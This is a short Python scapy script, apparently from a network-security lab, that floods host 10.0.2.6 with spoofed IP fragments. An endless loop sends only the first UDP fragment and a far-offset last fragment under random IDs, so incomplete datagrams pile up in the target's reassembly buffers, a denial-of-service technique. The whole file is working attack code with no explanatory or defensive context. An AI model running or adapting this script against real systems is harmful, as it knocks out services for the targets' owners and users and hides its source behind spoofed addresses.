#!/usr/bin/python3
from scapy.all import *
DST_MAC = "08:00:27:05:41:63"
payload1,payload3  = "A" * 80,"C" * 80
ether = Ether(dst = DST_MAC)
ip = IP(src="1.2.3.4", dst="10.0.2.6")
ip.proto = 17 #udp protocol
#1st fragment has udp header!!!!!!!!!!!!!
udp = UDP(dport=9090)
udp.len = 65535
ip.frag = 0 #fragmentation index of start
ip.flags = 1 #more fragments
while(True):
    ip.id =  random.randint(1, 3000)#identifier of fragment
    pkt = ether/ip/udp/payload1
    pkt[UDP].chksum = 0 #optional for udp but need to be zero scappy do it for us if we don't specify it
    sendp(pkt,verbose=0)
    print(payload1, end="")
    #3rd fragment!!!!!!!!!!!!!!!!!
    ip.frag = 8100 #fragment3 start index
    ip.flags = 0 #no more fragments
    pkt = ether/ip/payload3
    sendp(pkt,verbose=0)
    print(payload3)